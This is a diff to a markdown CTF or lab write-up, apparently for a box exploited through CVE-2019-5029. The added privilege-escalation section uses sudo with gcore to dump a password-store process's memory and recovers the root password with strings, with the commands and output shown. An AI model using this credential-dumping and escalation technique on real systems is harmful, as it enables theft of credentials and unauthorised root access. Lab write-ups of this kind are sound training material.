@@ -88,13 +88,13 @@ Notes:
 
 <mark style="color:yellow;">Searchsploit</mark>:&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 * <mark style="color:yellow;">CVE-2019-5029</mark>
 
 Version Enumeration:&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>v1.0 -- Confirming vulnerability to CVE-2019-5029</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>v1.0 -- Confirming vulnerability to CVE-2019-5029</p></figcaption></figure>
 
 ## Exploitation
 
@@ -135,8 +135,56 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 ## Privilege Escalation
 
-### Local enumeration
+Attempted to exploit Polkit but it did not work for some reason because SSH kept asking for a password even when I would generate SSH keys on the target and transfer it to Kali -- Moving on.
 
-### PrivEsc vector
+* Uploaded linpeas and found a few interesting things
 
-## Proofs
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>password-store looks interesting</p></figcaption></figure>
+
+sudo -l command output:
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+GTFOBins:
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+* We see that gcore can be used to generate core dumps of running processes
+* Files often containing sensitive information can be targetted this way
+* Since we can leverage our permissions with <mark style="color:yellow;">sudo + gcore, can we dump password-store</mark>?
+
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption><p>using ps command to find pid of password-store to use with gcore</p></figcaption></figure>
+
+* We see that <mark style="color:yellow;">password-store has a PID of 493</mark>
+* Time to run <mark style="color:yellow;">gcore</mark> on it
+
+gcore (create dump of PID 493):
+
+```
+sudo gcore 493
+(...)
+
+Saved corefile core.493
+```
+
+* Dump was saved as core.493
+
+Reading contents of dump with strings:
+
+```
+strings core.493
+
+(...)
+Password: root:
+ClogKingpinInning731
+(...)
+```
+
+* We seemingly obtain the root password
+
+```
+su
+Password: ClogKingpinInning731
+```
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>We are root!</p></figcaption></figure>
